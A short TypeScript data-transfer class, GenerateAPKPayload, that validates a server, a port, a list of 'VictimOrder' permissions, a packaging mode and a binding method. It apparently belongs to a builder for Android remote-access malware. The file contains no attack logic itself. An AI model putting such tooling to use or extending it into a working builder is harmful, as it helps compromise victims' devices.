import { Transform } from 'class-transformer';
import { IsArray, IsEnum, IsNumber, IsString } from 'class-validator';

import { BindingMethod, PackagingMode, VictimOrder } from '../../common/enums';
import { type IGenerateAPKPayload } from '../../common/interfaces';

export class GenerateAPKPayload implements IGenerateAPKPayload {
    @IsString()
    public server!: string;

    @IsNumber()
    @Transform(({ value }) => Number(value))
    public port!: number;

    @IsArray()
    @IsEnum(VictimOrder, { each: true })
    @Transform(({ value }) => value.split(',').filter(Boolean) as VictimOrder[])
    public permissions!: VictimOrder[];

    @IsEnum(PackagingMode)
    public packagingMode!: PackagingMode;

    @IsEnum(BindingMethod)
    public bindingMethod!: BindingMethod;
}
